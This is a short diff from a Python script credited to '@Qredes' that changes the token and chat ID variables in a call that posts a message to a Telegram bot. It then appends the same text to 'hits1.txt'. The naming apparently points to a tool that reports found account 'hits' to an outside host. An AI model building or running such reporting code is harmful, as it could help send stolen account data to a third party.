@@ -274,7 +274,7 @@ by : @Qredes
     by : @Qredes
     '''
   #  print(BLUE+tlg)
-    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+    try:requests.get(f"https://api.telegram.org/bot{HELLO_TOKEN}/sendMessage?chat_id={HELLO_ID}&text={tlg}")
     except:pass
     with open('hits1.txt','a') as ff:
       ff.write(f'{tlg}\n')
